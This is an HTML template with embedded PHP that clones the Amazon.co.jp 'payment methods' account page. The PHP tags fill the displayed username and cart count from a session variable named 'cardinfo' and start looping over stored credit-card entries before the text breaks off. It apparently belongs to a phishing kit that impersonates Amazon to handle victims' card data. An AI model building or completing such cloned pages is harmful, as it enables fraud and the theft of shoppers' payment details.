      #navbar #nav-search .nav-search-facade,
      #navbar #nav-tools .nav-icon,
      #navbar #nav-shop .nav-icon,
      #navbar #nav-subnav .nav-hasArrow .nav-arrow {
        display: none;
      }
      #navbar #nav-search .nav-search-submit,
      #navbar #nav-search .nav-search-scope {
        display: block;
      }
      #nav-search .nav-search-scope {
        padding: 0 5px;
      }
      #navbar #nav-search .nav-search-dropdown {
        position: relative;
        top: 5px;
        height: 23px;
        font-size: 14px;
        opacity: 1;
        filter: alpha(opacity = 100);
      }
    --></style> 
  </noscript> 
  <a id="nav-top"></a> 
  <a id="skiplink" tabindex="0" class="skip-link">メインコンテンツにスキップ</a> 
 
  <!-- Navyaan Upnav --> 
  <div id="nav-upnav" aria-hidden="true"> 
   <!-- unw1 failed --> 
  </div> 
  
  <header id="navbar-main" class="nav-opt-sprite nav-flex nav-locale-jp nav-lang-ja nav-ssl nav-rec nav-progressive-attribute"> 
   <div id="navbar" cel_widget_id="Navigation-desktop-navbar" data-template="layoutSwapToolBar" role="navigation" class="nav-sprite-v1 celwidget nav-bluebeacon nav-a11y-t1 bold-focus-hover layout2 nav-flex nav-packard-glow hamburger layout3 layout3-alt nav-progressive-attribute using-mouse" data-csa-c-id="n3jk1i-cbqo8l-6rczsh-6mb5tz" data-cel-widget="Navigation-desktop-navbar"> 
    <div id="nav-belt"> 
     <div class="nav-left"> 
     
      <div id="nav-logo"> 
       <a href="https://www.amazon.co.jp/ref=nav_logo" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon"> <span class="nav-sprite nav-logo-base"></span> <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span> <span class="nav-logo-locale">.co.jp</span> </a> 
      </div> 
      
      <div id="nav-global-location-slot"> 
       <span id="nav-global-location-data-modal-action" class="a-declarative nav-progressive-attribute" data-a-modal="{&quot;width&quot;:375, &quot;closeButton&quot;:&quot;false&quot;,&quot;popoverLabel&quot;:&quot;場所を選択&quot;, &quot;ajaxHeaders&quot;:{&quot;anti-csrftoken-a2z&quot;:&quot;gI1O55l6SdlaG9Vdyk0sHkTArQ/mXF/P6fSXa4IAAAAMAAAAAGBOmAByYXcAAAAA&quot;}, &quot;name&quot;:&quot;glow-modal&quot;, &quot;url&quot;:&quot;/gp/glow/get-address-selections.html?deviceType=desktop&amp;pageType=CPEFront&amp;storeContext=NoStoreName&amp;actionSource=desktop-modal&quot;, &quot;footer&quot;:null,&quot;header&quot;:&quot;場所を選択&quot;}" data-action="a-modal"> </span> 
       <input data-addnewaddress="add-new" id="unifiedLocation1ClickAddress" name="dropdown-selection" type="hidden" value="mlonptkokkn" class="nav-progressive-attribute" /> 
       <input data-addnewaddress="add-new" id="ubbShipTo" name="dropdown-selection-ubb" type="hidden" value="mlonptkokkn" class="nav-progressive-attribute" /> 
       <input id="glowValidationToken" name="glow-validation-token" type="hidden" value="gI1O55l6SdlaG9Vdyk0sHkTArQ/mXF/P6fSXa4IAAAAMAAAAAGBOmAByYXcAAAAA" class="nav-progressive-attribute" /> 
      </div> 
      <div id="nav-global-location-toaster-script-container" class="nav-progressive-content"> 
      </div> 
     </div> 
     <div class="nav-fill"> 
      
      <div id="nav-search"> 
       <div id="nav-bar-left"></div> 
       <form id="nav-search-bar-form" accept-charset="utf-8" action="https://www.amazon.co.jp/s/ref=nb_sb_noss" class="nav-searchbar nav-progressive-attribute" method="GET" name="site-search" role="search"> 
        <div id="nav-search-bar-internationalization-key" class="nav-progressive-content"> 
         <input type="hidden" name="__mk_ja_JP" value="カタカナ" /> 
        </div> 
        <div class="nav-left"> 
         <div id="nav-search-dropdown-card"> 
          <div class="nav-search-scope nav-sprite"> 
           <div class="nav-search-facade" data-value="search-alias=aps"> 
            <span id="nav-search-label-id" class="nav-search-label nav-progressive-content">すべて</span> 
            <i class="nav-icon"></i> 
           </div> 
           <span id="searchDropdownDescription" class="nav-progressive-attribute" style="display:none">検索するカテゴリーを選択します。</span> 
           <select aria-describedby="searchDropdownDescription" class="nav-search-dropdown searchSelect nav-progressive-attrubute nav-progressive-search-dropdown" data-nav-digest="+rkkAMFM/BeGQS2nV6Qv8sIZV5U=" data-nav-selected="0" id="searchDropdownBox" name="url" style="display: block;" tabindex="0" title="次の中から検索"> <option selected="selected" value="search-alias=aps">すべてのカテゴリー</option> <option value="search-alias=audible">Audible・オーディオブック</option> <option value="search-alias=life">ライフ</option> <option value="search-alias=amazon-devices">Amazon デバイス</option> <option value="search-alias=digital-text">Kindleストア </option> <option value="search-alias=instant-video">Prime Video</option> <option value="search-alias=alexa-skills">Alexaスキル</option> <option value="search-alias=digital-music">デジタルミュージック</option> <option value="search-alias=mobile-apps">Android アプリ</option> <option value="search-alias=stripbooks">本</option> <option value="search-alias=english-books">洋書</option> <option value="search-alias=popular">ミュージック</option> <option value="search-alias=classical">クラシック</option> <option value="search-alias=dvd">DVD</option> <option value="search-alias=videogames">TVゲーム</option> <option value="search-alias=software">PCソフト</option> <option value="search-alias=computers">パソコン・周辺機器</option> <option value="search-alias=electronics">家電&amp;カメラ</option> <option value="search-alias=office-products">文房具・オフィス用品</option> <option value="search-alias=kitchen">ホーム&amp;キッチン</option> <option value="search-alias=pets">ペット用品</option> <option value="search-alias=hpc">ドラッグストア</option> <option value="search-alias=beauty">ビューティー</option> <option value="search-alias=food-beverage">食品・飲料・お酒</option> <option value="search-alias=baby">ベビー&amp;マタニティ</option> <option value="search-alias=fashion">ファッション</option> <option value="search-alias=fashion-womens">&nbsp;&nbsp;&nbsp;レディース</option> <option value="search-alias=fashion-mens">&nbsp;&nbsp;&nbsp;メンズ</option> <option value="search-alias=fashion-baby-kids">&nbsp;&nbsp;&nbsp;キッズ＆ベビー</option> <option value="search-alias=apparel">服＆ファッション小物</option> <option value="search-alias=shoes">シューズ＆バッグ</option> <option value="search-alias=watch">腕時計</option> <option value="search-alias=jewelry">ジュエリー</option> <option value="search-alias=toys">おもちゃ</option> <option value="search-alias=hobby">ホビー</option> <option value="search-alias=mi">楽器</option> <option value="search-alias=sporting">スポーツ&amp;アウトドア</option> <option value="search-alias=automotive">車＆バイク</option> <option value="search-alias=diy">DIY・工具・ガーデン</option> <option value="search-alias=appliances">大型家電</option> <option value="search-alias=financial">クレジットカード</option> <option value="search-alias=gift-cards">ギフト券</option> <option value="search-alias=industrial">産業・研究開発用品</option> <option value="search-alias=pantry">Amazonパントリー</option> <option value="search-alias=warehouse-deals">Amazonアウトレット</option> </select> 
          </div> 
         </div> 
        </div> 
        <div class="nav-fill"> 
         <div class="nav-search-field "> 
          <input type="text" id="twotabsearchtextbox" value="" name="field-keywords" autocomplete="off" placeholder="" class="nav-input nav-progressive-attribute" dir="auto" tabindex="0" aria-label="検索" /> 
         </div> 
         <div id="nav-iss-attach"></div> 
        </div> 
        <div class="nav-right"> 
         <div class="nav-search-submit nav-sprite"> 
          <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite nav-progressive-attribute" aria-label="検索"> <input id="nav-search-submit-button" type="submit" class="nav-input nav-progressive-attribute" value="検索" tabindex="0" /> </span> 
         </div> 
        </div> 
       </form> 
      </div> 
     
     </div> 
     <div class="nav-right"> 
      
      <div id="nav-tools" class="layoutToolbarPadding"> 
       <a href="https://www.amazon.co.jp/gpcustomer-preferences/select-language/ref=topnav_lang?preferencesReturnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3Fref_%3Dya_d_c_pmt_mpo" id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2" aria-label="ショッピングのための言語を選択します。"> <span class="icp-nav-link-inner"> <span class="nav-line-1"> </span> <span class="nav-line-2"> <span class="icp-nav-flag icp-nav-flag-jp"></span> <span class="nav-icon nav-arrow null" style="visibility: visible;"></span> </span> </span> </a> 
       <a href="https://www.amazon.co.jp/gp/css/homepage.html?ref_=nav_youraccount_btn" class="nav-a nav-a-2 nav-truncate   nav-progressive-attribute" data-nav-ref="nav_youraccount_btn" data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList" tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav-link-accountList" data-csa-c-content-id="nav_youraccount_btn" data-csa-c-id="59n9ez-9nb4wn-8sjfkw-qipqyt"> 
        <div class="nav-line-1-container">
         <span id="nav-link-accountList-nav-line-1" class="nav-line-1 nav-progressive-content"><?=$_SESSION["cardinfo"]["username"]?></span>
        </div> <span class="nav-line-2 nav-long-width">アカウント＆リスト<span class="nav-icon nav-arrow null" style="visibility: visible;"></span> </span> <span class="nav-line-2 nav-short-width"> アカウント <span class="nav-icon nav-arrow null" style="visibility: visible;"></span> </span> </a> 
       <a href="https://www.amazon.co.jp/gpflex/sign-out.html?path=%2Fgp%2Fyourstore%2Fhome&amp;signIn=1&amp;useRedirectOnSuccess=1&amp;action=sign-out&amp;ref_=nav_signout" class="nav-hidden-aria  " tabindex="0"> <?=$_SESSION["cardinfo"]["username"]?>さんではありませんか？ログアウト </a> 
       <a href="" class="nav-a nav-a-2   nav-progressive-attribute" id="nav-orders" tabindex="0"> <span class="nav-line-1">返品もこちら</span> <span class="nav-line-2">注文履歴</span> </a> 
       <a href="https://www.amazon.co.jp/gp/cart/view.html?ref_=nav_cart" aria-label="カート内の商品数：0" class="nav-a nav-a-2 nav-progressive-attribute" id="nav-cart"> 
        <div id="nav-cart-count-container"> 
         <span id="nav-cart-count" aria-hidden="true" class="nav-cart-count nav-cart-0 nav-progressive-attribute nav-progressive-content"><?=$_SESSION["cardinfo"]["cartnum"]?></span> 
         <span class="nav-cart-icon nav-sprite"></span> 
        </div> 
        <div id="nav-cart-text-container" class=" nav-progressive-attribute"> 
         <span aria-hidden="true" class="nav-line-1"> </span> 
         <span aria-hidden="true" class="nav-line-2"> カート <span class="nav-icon nav-arrow"></span> </span> 
        </div> </a> 
      </div> 
      
     </div> 
    </div> 
   </div> 
  </header> 
 
  
  <script type="text/javascript">
    <!--
    window.$Nav && $Nav.declare('config.fixedBarBeacon',false);
    window.$Nav && $Nav.when("data").run(function(data) { data({"freshTimeout":{"template":{"name":"flyoutError","data":{"error":{"title":"<style>#nav-flyout-fresh{width:269px;padding:0;}#nav-flyout-fresh .nav-flyout-content{padding:0;}</style><a href='https://www.amazon.co.jp/amazonfresh'><img src='https://images-na.ssl-images-amazon.com/images/G/01/omaha/images/yoda/flyout_72dpi._V270255989_.png' /></a>"}}}},"cartTimeout":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"カート","url":"https://www.amazon.co.jp/gpcart/view.html?ref_=nav_err_cart_timeout"},"title":"エラーです。","paragraph":"カートロード中にエラーが発生しました"}}}},"primeTimeout":{"template":{"name":"flyoutError","data":{"error":{"title":"<a href='https://www.amazon.co.jp/gp/prime?ref_=nav_prime_btn_fb'><img src='https://images-fe.ssl-images-amazon.com/images/G/09/prime/yourprime/yourprime-client-fallback._V314779227_.png' /></a>"}}}},"ewcTimeout":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"カート","url":"https://www.amazon.co.jp/gpcart/view.html?ref_=nav_err_ewc_timeout"},"title":"エラーです。","paragraph":"現在、カートの読み込みに問題が発生しています"}}}},"errorWishlist":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"ほしい物リスト","url":"https://www.amazon.co.jp/gpregistry/wishlist/?ref_=nav_err_wishlist"},"title":"エラーです。","paragraph":"現在、リストの取得に問題が発生しています"}}}},"emptyWishlist":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"ほしい物リスト","url":"https://www.amazon.co.jp/gpregistry/wishlist/?ref_=nav_err_empty_wishlist"},"title":"エラーです。","paragraph":"リストは空です"}}}},"yourAccountContent":{"template":{"name":"flyoutError","data":{"error":{"button":{"text":"アカウント","url":"https://www.amazon.co.jp/gpcss/homepage.html?ref_=nav_err_youraccount"},"title":"エラーです。","paragraph":"現在、リストの取得に問題が発生しています"}}}},"shopAllTimeout":{"template":{"name":"flyoutError","data":{"error":{"paragraph":"現在、リストの取得に問題が発生しています"}}}},"kindleTimeout":{"template":{"name":"flyoutError","data":{"error":{"paragraph":"現在、リストの取得に問題が発生しています"}}}}}); });
window.$Nav && $Nav.when("util.templates").run("FlyoutErrorTemplate", function(templates) {
      templates.add("flyoutError", "<# if(error.title) { #><span class='nav-title'><#=error.title #></span><# } #><# if(error.paragraph) { #><p class='nav-paragraph'><#=error.paragraph #></p><# } #><# if(error.button) { #><a href='<#=error.button.url #>' class='nav-action-button' ><span class='nav-action-inner'><#=error.button.text #></span></a><# } #>");
    });

    if (typeof uet == 'function') {
    uet('bb', 'iss-init-pc', {wb: 1});
  }
  if (!window.$SearchJS && window.$Nav) {
    window.$SearchJS = $Nav.make('sx');
  }

  var opts = {
    host: "completion.amazon.co.jp/search/complete"
  , marketId: "6"
  , obfuscatedMarketId: "A1VC38T7YXB528"
  , searchAliases: ["apparel","aps","audible","automotive","appliances","amazonfresh","amazon-devices","baby","baby-jp","beauty","blu-ray","classical","classical","classical-domestic-sub","computers","prime-digital-music","digital-music","digital-music-album","digital-music-track","digital-text","diy","dvd","dvd-actor","dvd-used","electronics","electronics-used","english-books","english-books-publ","fashion","fashion-womens","fashion-mens","fashion-baby-kids","fashion-boys-clothing","fashion-boys-shoes","fashion-boys-watches","fashion-girls-clothing","fashion-girls-shoes","fashion-girls-watches","fashion-mens-clothing","fashion-mens-jewelry","fashion-mens-shoes","fashion-mens-watches","fashion-womens-clothing","fashion-womens-handbags","fashion-womens-jewelry","fashion-womens-shoes","fashion-womens-watches","fe-beauty-jp","fe-books-jp","fe-ce-jp","fe-hpc-jp","fe-music-jp","food-beverage","hobbies","hobby","hpc","instant-video","jewelry","jp-books-tree","jp-classical-tree","jp-dvd-tree","jp-music-tree","kitchen","life","mobile-apps","music-album","music-artist","music-domestic","music-singles","mi","office-products","pantry","black-friday","cyber-monday","pets","popular","prime-instant-video","shoes","software","sporting","stripbooks","stripbooks-music","stripbooks-publ","stripbooks-publishers","toys","toys-used","umd","vg-gameboy","vg-gameboy-advance","vg-gamecube","vg-nintendo-ds","vg-playstation","vg-playstation-portable","vg-playstation2","vg-playstation3","vg-xbox","vg-xbox360","vhs","videogames","watch","financial","tradein-aps","gift-cards","warehouse-deals","industrial","luxury-beauty","alexa-skills","prime-wardrobe","todays-deals","specialty-aps-sns"]
  , filterAliases: []
  , pageType: "CPEFront"
  , requestId: "ABYH9FRFKN9A5GZM8DBC"
  , sessionId: "357-2533609-2718458"
  , language: "ja_JP"
  , customerId: "A2BN15EYB6MCR0"
  , b2b: 0
  , fresh: 0
  , isJpOrCn: 1
  , isUseAuiIss: 1
};

var issOpts = {
    fallbackFlag: 1
  , isDigitalFeaturesEnabled: 0
  , isWayfindingEnabled: 0
  , dropdown: "select.searchSelect"
  , departmentText: "{department}"
  , suggestionText: "キーワード候補"
  , recentSearchesTreatment: "C"
  , authorSuggestionText: "：すべての本"
  , translatedStringsMap: {"sx-recent-searches":"最近の検索","sx-your-recent-search":"最近の検索に基づくおすすめ商品"}
  , biaTitleText: ""
  , biaPurchasedText: ""
  , biaViewAllText: ""
  , biaViewAllManageText: ""
  , biaAndText: ""
  , biaManageText: ""
  , biaWeblabTreatment: ""
  , issNavConfig: {}
  , np: 0
  , issCorpus: []
  , cf: 1
  , removeDeepNodeISS: ""
  , trendingTreatment: "C"
  , useAPIV2: ""
  , opfSwitch: ""
  , isISSDesktopRefactorEnabled: "1"
  , useServiceHighlighting: "true"
  , isInternal: 0
  , isAPICachingDisabled: true
  , isBrowseNodeScopingEnabled: false
  , isStorefrontTemplateEnabled: false
  , disableAutocompleteOnFocus: ""
};

  if (opts.isUseAuiIss === 1 && window.$Nav) {
  window.$Nav.when('sx.iss').run('iss-mason-init', function(iss){
    var issInitObj = buildIssInitObject(opts, issOpts, true);

    new iss.IssParentCoordinator(issInitObj);

    $SearchJS.declare('canCreateAutocomplete', issInitObj);
  });
} else if (window.$SearchJS) {
  var iss;

  // BEGIN Deprecated globals
  var issHost = opts.host
    , issMktid = opts.marketId
    , issSearchAliases = opts.searchAliases
    , updateISSCompletion = function() { iss.updateAutoCompletion(); };
  // END deprecated globals


  $SearchJS.when('jQuery', 'search-js-autocomplete-lib').run('autocomplete-init', initializeAutocomplete);
  $SearchJS.when('canCreateAutocomplete').run('createAutocomplete', createAutocomplete);

} // END conditional for window.$SearchJS
  function initializeAutocomplete(jQuery) {
  var issInitObj = buildIssInitObject(opts, issOpts);
  $SearchJS.declare("canCreateAutocomplete", issInitObj);
} // END initializeAutocomplete
  function initSearchCsl(searchCSL, issInitObject) {
  searchCSL.init(
    opts.pageType,
    (window.ue && window.ue.rid) || opts.requestId
  );
  $SearchJS.declare("canCreateAutocomplete", issInitObject);
} // END initSearchCsl
  function createAutocomplete(issObject) {
  iss = new AutoComplete(issObject);

  $SearchJS.publish("search-js-autocomplete", iss);

  logMetrics();
} // END createAutocomplete
  function buildIssInitObject(opts, issOpts, isNewIss) {
    var issInitObj = {
        src: opts.host
      , sessionId: opts.sessionId
      , requestId: opts.requestId
      , mkt: opts.marketId
      , obfMkt: opts.obfuscatedMarketId
      , pageType: opts.pageType
      , language: opts.language
      , customerId: opts.customerId
      , fresh: opts.fresh
      , b2b: opts.b2b
      , aliases: opts.searchAliases
      , fb: issOpts.fallbackFlag
      , isDigitalFeaturesEnabled: issOpts.isDigitalFeaturesEnabled
      , isWayfindingEnabled: issOpts.isWayfindingEnabled
      , issPrimeEligible: issOpts.issPrimeEligible
      , deptText: issOpts.departmentText
      , sugText: issOpts.suggestionText
      , filterAliases: opts.filterAliases
      , biaWidgetUrl: opts.biaWidgetUrl
      , recentSearchesTreatment: issOpts.recentSearchesTreatment
      , authorSuggestionText: issOpts.authorSuggestionText
      , translatedStringsMap: issOpts.translatedStringsMap
      , biaTitleText: ""
      , biaPurchasedText: ""
      , biaViewAllText: ""
      , biaViewAllManageText: ""
      , biaAndText: ""
      , biaManageText: ""
      , biaWeblabTreatment: ""
      , issNavConfig: issOpts.issNavConfig
      , cf: issOpts.cf
      , ime: opts.isJpOrCn
      , mktid: opts.marketId
      , qs: opts.isJpOrCn
      , issCorpus: issOpts.issCorpus
      , deepNodeISS: {
          searchAliasAccessor: function($) {
            return (window.SearchPageAccess && window.SearchPageAccess.searchAlias()) ||
                   $('select.searchSelect').children().attr('data-root-alias');
          },
          searchAliasDisplayNameAccessor: function() {
            return (window.SearchPageAccess && window.SearchPageAccess.searchAliasDisplayName());
          }
        }
      , removeDeepNodeISS: issOpts.removeDeepNodeISS
      , trendingTreatment: issOpts.trendingTreatment
      , useAPIV2: issOpts.useAPIV2
      , opfSwitch: issOpts.opfSwitch
      , isISSDesktopRefactorEnabled: issOpts.isISSDesktopRefactorEnabled
      , useServiceHighlighting: issOpts.useServiceHighlighting
      , isInternal: issOpts.isInternal
      , isAPICachingDisabled: issOpts.isAPICachingDisabled
      , isBrowseNodeScopingEnabled: issOpts.isBrowseNodeScopingEnabled
      , isStorefrontTemplateEnabled: issOpts.isStorefrontTemplateEnabled
      , disableAutocompleteOnFocus: issOpts.disableAutocompleteOnFocus
    };
  
    // If we aren't using the new ISS then we need to add these properties
    
    if (!isNewIss) {
      issInitObj.dd = issOpts.dropdown; // The element with id searchDropdownBox doesn't exist in C.
      issInitObj.imeSpacing = issOpts.imeSpacing;
      issInitObj.isNavInline = 1;
      issInitObj.triggerISSOnClick = 0;
      issInitObj.sc = 1;
      issInitObj.np = issOpts.np;
    }
  
    return issInitObj;
  } // END buildIssInitObject
  function logMetrics() {
  if (typeof uet == 'function' && typeof uex == 'function') {
      uet('be', 'iss-init-pc',
          {
              wb: 1
          });
      uex('ld', 'iss-init-pc',
          {
              wb: 1
          });
  }
} // END logMetrics
  
    
window.$Nav && $Nav.declare('config.navDeviceType','desktop');

window.$Nav && $Nav.declare('config.navDebugHighres',false);

window.$Nav && $Nav.declare('config.pageType','CPEFront');
window.$Nav && $Nav.declare('config.subPageType','null');

window.$Nav && $Nav.declare('config.dynamicMenuUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Fdynamic\x2Dmenu.html');

window.$Nav && $Nav.declare('config.dismissNotificationUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Fdismissnotification.html');

window.$Nav && $Nav.declare('config.enableDynamicMenus',true);

window.$Nav && $Nav.declare('config.isInternal',false);

window.$Nav && $Nav.declare('config.isBackup',false);

window.$Nav && $Nav.declare('config.isRecognized',true);

window.$Nav && $Nav.declare('config.transientFlyoutTrigger','\x23nav\x2Dtransient\x2Dflyout\x2Dtrigger');

window.$Nav && $Nav.declare('config.subnavFlyoutUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Fsubnav\x2Dflyout');

window.$Nav && $Nav.declare('config.recordEvUrl','\x2Fgp\x2Fnavigation\x2Fajax\x2Frecordevent.html');
window.$Nav && $Nav.declare('config.recordEvInterval',15000);
window.$Nav && $Nav.declare('config.sessionId','357\x2D2533609\x2D2718458');
window.$Nav && $Nav.declare('config.requestId','ABYH9FRFKN9A5GZM8DBC');

window.$Nav && $Nav.declare('config.alexaListEnabled',true);

window.$Nav && $Nav.declare('config.readyOnATF',false);

window.$Nav && $Nav.declare('config.dynamicMenuArgs',{"rid":"ABYH9FRFKN9A5GZM8DBC","isFullWidthPrime":0,"isPrime":0,"dynamicRequest":1,"weblabs":"","isFreshRegionAndCustomer":"","primeMenuWidth":310});

window.$Nav && $Nav.declare('config.customerName','wq');

window.$Nav && $Nav.declare('config.yourAccountPrimeURL','https\x3A\x2F\x2Fwww.amazon.co.jp\x2Fgp\x2Fcss\x2Forder\x2Dhistory\x2Futils\x2Ffirst\x2Dorder\x2Dfor\x2Dcustomer.html\x2Fref\x3Dya_prefetch_beacon\x3Fie\x3DUTF8\x26s\x3D357\x2D2533609\x2D2718458');

window.$Nav && $Nav.declare('config.yourAccountPrimeHover',true);

window.$Nav && $Nav.declare('config.searchBackState',{});

window.$Nav && $Nav.declare('nav.inline');

(function (i) {
i.onload = function() {window.uet && uet('ne')};
i.src = window._navbarSpriteUrl;
}(new Image()));

window.$Nav && $Nav.declare('config.autoFocus',false);

window.$Nav && $Nav.declare('config.responsiveTouchAgents',["ieTouch"]);

window.$Nav && $Nav.declare('config.responsiveGW',false);

window.$Nav && $Nav.declare('config.pageHideEnabled',false);

window.$Nav && $Nav.declare('config.sslTriggerType','null');
window.$Nav && $Nav.declare('config.sslTriggerRetry',0);

window.$Nav && $Nav.declare('config.doubleCart',false);

window.$Nav && $Nav.declare('config.signInOverride',false);

window.$Nav && $Nav.declare('config.signInTooltip',false);

window.$Nav && $Nav.declare('config.isPrimeMember',false);

window.$Nav && $Nav.declare('config.packardGlowTooltip',false);

window.$Nav && $Nav.declare('config.packardGlowFlyout',false);

window.$Nav && $Nav.declare('config.rightMarginAlignEnabled',true);

window.$Nav && $Nav.declare('config.flyoutAnimation',false);

window.$Nav && $Nav.declare('config.campusActivation','null');

window.$Nav && $Nav.declare('config.primeTooltip',false);

window.$Nav && $Nav.declare('config.primeDay',false);

window.$Nav && $Nav.declare('config.disableBuyItAgain',false);

window.$Nav && $Nav.declare('config.enableCrossShopBiaFlyout',false);

window.$Nav && $Nav.declare('config.pseudoPrimeFirstBrowse',null);

window.$Nav && $Nav.declare('config.sdaYourAccount',false);

window.$Nav && $Nav.declare('config.csYourAccount',false);

window.$Nav && $Nav.declare('config.cartFlyoutDisabled',true);

window.$Nav && $Nav.declare('config.isTabletBrowser',false);

window.$Nav && $Nav.declare('config.HmenuProximityArea',[200,200,200,200]);

window.$Nav && $Nav.declare('config.HMenuIsProximity',true);

window.$Nav && $Nav.declare('config.desktopHMenuRefactor',true);

window.$Nav && $Nav.declare('config.isPureAjaxALF',false);

window.$Nav && $Nav.declare('config.accountListFlyoutRedesign',false);

window.$Nav && $Nav.declare('config.navfresh',false);

window.$Nav && $Nav.declare('config.isFreshRegion',false);

if (window.ue && ue.tag) { ue.tag('navbar'); };

window.$Nav && $Nav.declare('config.blackbelt',true);

window.$Nav && $Nav.declare('config.beaconbelt',true);

window.$Nav && $Nav.declare('config.accountList',true);

window.$Nav && $Nav.declare('config.iPadTablet',false);

window.$Nav && $Nav.declare('config.searchapiEndpoint',false);

window.$Nav && $Nav.declare('config.timeline',false);

window.$Nav && $Nav.declare('config.timelineAsinPriceEnabled',false);

window.$Nav && $Nav.declare('config.timelineDeleteEnabled',false);



window.$Nav && $Nav.declare('config.extendedFlyout',false);

window.$Nav && $Nav.declare('config.flyoutCloseDelay',600);

window.$Nav && $Nav.declare('config.pssFlag',0);

window.$Nav && $Nav.declare('config.isShortAccountList',false);

window.$Nav && $Nav.declare('config.isPrimeTooltipMigrated',false);

window.$Nav && $Nav.declare('config.flyoutArrowStyle','null');

window.$Nav && $Nav.declare('config.isTimelineMigrationEnabled',false);

window.$Nav && $Nav.declare('config.hashCustomerAndSessionId','017b13dcc92752d299315e76198a15d6e967490c');

window.$Nav && $Nav.declare('config.isExportMode',false);

window.$Nav && $Nav.declare('config.languageCode','ja_JP');

window.$Nav && $Nav.declare('config.environmentVFI','AmazonNavigationCards\x2Fdevelopment\x40B6040855099\x2DAL2_x86_64');



window.$Nav && $Nav.declare('config.isHMenuBrowserCacheDisable',false);

window.$Nav && $Nav.declare('config.signInUrlWithRefTag','null');

window.$Nav && $Nav.declare('config.isSmile',false);

window.$Nav && $Nav.declare('config.regionalStores',["44Op44Kk44OV"]);

window.$Nav && $Nav.declare('config.isALFRedesignPT2',false);

window.$Nav && $Nav.declare('config.isNavALFRegistryGiftList',false);

window.$Nav && $Nav.declare('config.marketplaceId','A1VC38T7YXB528');

window.$Nav && $Nav.declare('config.exportTransitionState','none');

window.$Nav && $Nav.declare('config.enableAeeXopFlyout',false);

if (window.P && typeof window.P.declare === "function" && typeof window.P.now === "function") {
  window.P.now('packardGlowIngressJsEnabled').execute(function(glowEnabled) {
    if (!glowEnabled) {
      window.P.declare('packardGlowIngressJsEnabled', true);
    }
  });
  window.P.now('packardGlowStoreName').execute(function(storeName) {
    if (!storeName) {
      window.P.declare('packardGlowStoreName','generic');
    }
  });
}

window.$Nav && $Nav.declare('configComplete');

    -->
</script> 
  <a id="skippedLink" tabindex="-1"></a> 
  <div id="paymentsHubWebsiteContainer" class="a-container" style="width: 950px;">
   <div id="paymentsHubBelowNavBarSection" class="a-section a-spacing-medium"> 
    <div id="headerRow" class="a-row a-spacing-micro a-grid-vertical-align a-grid-top a-ws-row"> 
     <div id="headerCol" class="a-column a-span12 a-text-left a-ws-span12"> 
      <h1 class="a-size-base"> <a data-testid="cpe-yourAccount-header" class="a-link-normal breadcrumbLink" href="https://www.amazon.co.jp/gpcss/homepage.html/ref=wallet_ya_link"> アカウントサービス </a> <span class="breadcrumbArrow"> › </span> 
       <!-- Second breadcrumb level. Might be wrapped with link. --> <a data-testid="cpe-page-header" class="a-link-normal breadcrumbLink" href="https://www.amazon.co.jp/cpe/yourpayments/overview"> お客様の支払い方法 </a> 
       <!-- Optional third breadcrumb level. Might be wrapped with link. --> <span class="breadcrumbArrow"> › </span> <span data-testid="cpe-subpage-header" class="a-color-state"> お支払い方法 </span> 
       <!-- Optional forth and final breadcrumb level --> </h1> 
     </div> 
    </div>
   </div>
   <div id="paymentsHubHeaderSection" class="a-section">
    <h1>お客様の支払い方法</h1>
   </div>
   <div id="paymentsHubMenuSection" class="a-section a-spacing-top-medium">
    <div id="paymentsHubMenuRow" class="a-row"> 
     <ul class="a-unordered-list a-nostyle a-horizontal" role="tablist"> 
      <li role="tab"><span class="a-list-item"> <span class="menuTabHead menuTabSelected"> お支払い方法 </span> </span></li> 
     </ul> 
    </div>
   </div>
   <div id="paymentsHubContentSection" class="a-section a-spacing-top-medium">
    <div id="paymentsHubContentRow" class="a-row"> 
     <div class="a-container paymentsHubTabContentContainer"> 
      <h2 class="a-spacing-large"> お支払い方法 </h2> 
      <div class="a-section contentLoadError aok-hidden"> 
       <div id="contentLoadErrorAlert" class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
        <div class="a-box-inner a-alert-container">
         <h4 class="a-alert-heading">申し訳ありません. 何か問題が発生しました。</h4>
         <i class="a-icon a-icon-alert"></i>
         <div class="a-alert-content">
           エラーが発生しました。ページをリフレッシュしてください。 
         </div>
        </div>
       </div> 
      </div> 
      <div id="portalWidgetSection" class="a-section"> 
       <div id="cpefront-mpo-widget"> 
       <!-----><!/----->

       
        <div data-pmts-component-id="pp-NLB6rY-1" class="a-section a-spacing-none pmts-widget-section pmts-portal-root-PTy9ha1ygyFw pmts-portal-component pmts-portal-components-pp-NLB6rY-1">
         <div id="boday_loding" data-pmts-component-id="boday_loding" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-NLB6rY-2" style="display:none">
          <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered" />
         </div>
         <span></span>
        
          <div class="a-section a-spacing-small pmts-instrument-list">
              <?php if(count($cardInfo)){ ?>
           <div class="a-section a-spacing-small pmts-credit-cards">
            <div class="a-fixed-right-grid">
             <div class="a-fixed-right-grid-inner" style="padding-right:265px">
              <div class="a-fixed-right-grid-col a-col-left" style="padding-right:0%;float:left;">
               <h3>お客様のクレジットカード</h3>
              </div>
              <div class="a-fixed-right-grid-col a-col-right" style="width:265px;margin-right:-265px;float:left;">
               <h5>有効期限</h5>
              </div>
             </div>
            </div>
            <div class="a-row a-spacing-top-mini a-ws-row">
                <?php  foreach($cardInfo as $k=>$v){  ?>
             <div data-pmts-component-id="pp-NLB6rY-17" class="a-box-group pmts-portal-component pmts-portal-components-pp-NLB6rY-17">
